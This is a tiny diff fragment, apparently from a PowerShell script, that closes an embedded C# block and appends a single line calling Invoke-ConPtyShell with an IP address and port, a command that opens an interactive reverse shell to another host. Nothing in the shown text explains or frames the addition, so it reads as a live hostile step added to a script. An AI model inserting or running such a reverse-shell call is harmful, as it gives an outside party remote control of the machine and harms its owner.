@@ -1713,3 +1713,5 @@ class MainClass
 }
 
 "@;
+
+Invoke-ConPtyShell 192.168.0.1 3001
